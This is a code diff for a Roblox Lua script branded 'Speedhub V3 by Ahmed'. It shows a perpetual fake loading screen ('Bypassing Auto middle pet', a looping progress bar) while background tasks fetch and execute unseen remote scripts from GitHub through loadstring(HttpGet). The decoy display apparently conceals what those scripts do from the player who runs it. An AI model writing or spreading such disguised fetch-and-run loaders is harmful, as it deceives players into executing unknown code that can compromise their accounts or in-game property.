@@ -1,11 +1,14 @@
+--///////////////////////////////////////////////////////
+-- Loading Screen + External Script (Sja)
+--///////////////////////////////////////////////////////
+
 local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 
 -- SETTINGS
 local stages = {"Bypassing Auto middle pet", "Optimizing", "Finishing"}
-local stageTime = 3 -- seconds each stage before switching
-local cycleTime = 5 -- seconds for progress bar 0% → 100%
+local stageTime = 5 -- seconds per stage
 
 -- Parent GUI
 local parentGui = CoreGui
@@ -34,13 +37,13 @@ Title.AnchorPoint = Vector2.new(0.5, 0.5)
 Title.Position = UDim2.new(0.5, 0, 0.2, 0)
 Title.Size = UDim2.new(0.8, 0, 0.08, 0)
 Title.Font = Enum.Font.GothamBold
-Title.Text = "Custom Loader"
+Title.Text = "Speedhub V3 by Ahmed"
 Title.TextScaled = true
 Title.TextColor3 = Color3.new(1, 1, 1)
 Title.BackgroundTransparency = 1
 Title.Parent = ScreenGui
 
--- Stage text
+-- Main text
 local Label = Instance.new("TextLabel")
 Label.AnchorPoint = Vector2.new(0.5, 0.5)
 Label.Position = UDim2.new(0.5, 0, 0.4, 0)
@@ -80,51 +83,55 @@ BarFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
 BarFill.BorderSizePixel = 0
 BarFill.Parent = BarBG
 
--- Notice text
-local Notice = Instance.new("TextLabel")
-Notice.AnchorPoint = Vector2.new(0.5, 1)
-Notice.Position = UDim2.new(0.5, 0, 0.95, 0)
-Notice.Size = UDim2.new(0.9, 0, 0.05, 0)
-Notice.Font = Enum.Font.Gotham
-Notice.Text = "UI won't load in private server, please use public"
-Notice.TextScaled = true
-Notice.TextColor3 = Color3.fromRGB(255, 100, 100)
-Notice.BackgroundTransparency = 1
-Notice.Parent = ScreenGui
+-- Warning text (bottom)
+local Warning = Instance.new("TextLabel")
+Warning.AnchorPoint = Vector2.new(0.5, 1)
+Warning.Position = UDim2.new(0.5, 0, 0.95, 0)
+Warning.Size = UDim2.new(0.9, 0, 0.05, 0)
+Warning.Font = Enum.Font.Gotham
+Warning.Text = "UI won't load in private server please use public"
+Warning.TextScaled = true
+Warning.TextColor3 = Color3.fromRGB(255, 100, 100)
+Warning.BackgroundTransparency = 1
+Warning.Parent = ScreenGui
 
--- Stage loop
-task.spawn(function()
-    while true do
-        for _, stageName in ipairs(stages) do
-            Label.Text = stageName
-            task.wait(stageTime)
-        end
-    end
-end)
-
--- Smooth progress bar loop
-task.spawn(function()
-    while true do
-        -- fill bar 0% → 100%
+-- Function for each stage
+local function showStage(text)
+    Label.Text = text
+    for i = 1, 100 do
+        local progress = i / 100
         TweenService:Create(
             BarFill,
-            TweenInfo.new(cycleTime, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
-            {Size = UDim2.new(1, 0, 1, 0)}
+            TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            {Size = UDim2.new(progress, 0, 1, 0)}
         ):Play()
-
-        for i = 1, 100 do
-            Percent.Text = i .. "%"
-            task.wait(cycleTime / 100)
-        end
-
-        -- reset bar instantly
-        BarFill.Size = UDim2.new(0, 0, 1, 0)
-        Percent.Text = "0%"
+        Percent.Text = string.format("%d%%", math.floor(progress * 100))
+        task.wait(stageTime / 100)
     end
+end
+
+--///////////////////////////////////////////////////////
+-- Run external scripts in background
+--///////////////////////////////////////////////////////
+
+-- Your Cliponthemsg script
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/R0bI0x9/Waiian/refs/heads/main/Cliponthemsg"))()
 end)
 
--- Run both scripts after execution
+-- The new Sja script
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/R0bI0x9/Mixandmatch/refs/heads/main/Fuckav"))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MRBROSKIENOOBIE/Ahmedv99/refs/heads/main/Speed%2520Hub%2520X.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/R0bI0x9/Shibal/refs/heads/main/Sja"))()
 end)
+
+--///////////////////////////////////////////////////////
+-- Loop the loading screen forever
+--///////////////////////////////////////////////////////
+while true do
+    for _, stageName in ipairs(stages) do
+        showStage(stageName)
+    end
+    -- reset bar after finishing all stages
+    BarFill.Size = UDim2.new(0, 0, 1, 0)
+    Percent.Text = "0%"
+end
